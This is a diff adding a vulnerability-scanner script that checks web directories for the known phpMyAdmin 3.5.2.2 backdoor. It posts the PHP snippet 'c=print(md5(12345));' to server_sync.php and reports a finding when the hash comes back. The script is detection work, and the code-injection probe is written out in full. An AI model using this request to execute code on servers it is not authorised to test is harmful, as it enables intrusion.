@@ -1,0 +1,37 @@
+#include helpers.inc;
+#include reporting_helpers.inc;
+#include string_helpers.inc;
+// **************************************************************************************
+function test_phpMyAdmin_3522_backdoor(dir, path){
+	if (!path.endsWith('/')) path = path + '/';
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'POST';
+	http.uri = path + 'server_sync.php';
+	http.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	http.addCookies = false;
+	http.request.body = "c=print(md5(12345));";
+	
+	http.execute();	
+	
+	if ((!http.wasError && http.responseStatus == 200)){
+		if(http.response.body && http.response.body.indexOf("827ccb0eea8a706c4c34a16891f84e7b") != -1) {
+				var ri = new TReportItem();
+				
+				ri.LoadFromFile("phpmyadmin_3522_backdoor.xml");
+				ri.affects = path + 'server_sync.php';
+				ri.alertPath = "Scripts/phpmyadmin_3522_backdoor";
+				ri.setHttpInfo(http);		
+				AddReportItem(ri);			
+		}
+	}
+}
+var dir = getCurrentDirectory();
+var alreadyReportedWebApplication = getGlobalValue("detectedAppphpMyAdmin");
+if (!alreadyReportedWebApplication)
+{
+    setGlobalValue("detectedAppphpMyAdmin", 1, true);           
+    KBase("phpMyAdmin web application", "phpMyAdmin web application was detected in directory [dark][bold]" + dir.fullPath + "[/bold][/dark].");
+}
+test_phpMyAdmin_3522_backdoor(dir, dir.fullPath);
